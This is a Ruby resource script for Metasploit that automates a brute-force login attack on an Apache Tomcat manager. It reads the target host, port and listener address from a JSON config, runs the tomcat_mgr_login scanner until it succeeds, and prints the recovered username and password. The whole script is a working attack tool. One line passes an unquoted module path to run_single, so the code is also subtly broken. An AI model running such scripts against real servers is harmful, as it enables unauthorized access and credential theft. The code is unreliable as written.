<ruby>
	require "json"

	def initialize_from_json(json_data)
		#set workspace name from config file
		framework.datastore["TOMCATHOST_201914271"] = json_data["TOMCATHOST_201914271"]
		framework.datastore["TOMCATPORT_201914271"] = json_data["TOMCATPORT_201914271"]
		framework.datastore["LHOST_VM"] = json_data["LHOST_VM"]
	end

	datastore = framework.datastore

	json_file = File.read("config_rc.json")
	json_data = JSON.parse(json_file)
	datastore["WORKSPACE_201914271"] = json_data["WORKSPACE_201914271"]

	#delete workspace with same name
	run_single("workspace -d #{datastore["WORKSPACE_201914271"]}")
	#set workspace to the selected one in config file
	run_single("workspace -a #{datastore["WORKSPACE_201914271"]}")
	print_status "USING WORKSPACE #{datastore["WORKSPACE_201914271"]}"
	initialize_from_json(json_data)

	run_single(use auxiliary/scanner/http/tomcat_mgr_login)
	run_single("set RHOSTS #{datastore["TOMCATHOST_201914271"]}")
	run_single("set LHOST #{datastore["LHOST_VM"]}")
	run_single("set RPORT #{datastore["TOMCATPORT_201914271"]}")
	run_single("set STOP_ON_SUCCESS true")
	run_single("run")

	begin
		cred = framework.db.creds.to_ary.find { |cr| cr.logins[0].host.address == datastore["TOMCATHOST_201914271"] }
		puts "#{cred.public}:#{cred.private}"
	rescue
		print_error("Credential not found")
		return
	end
</ruby>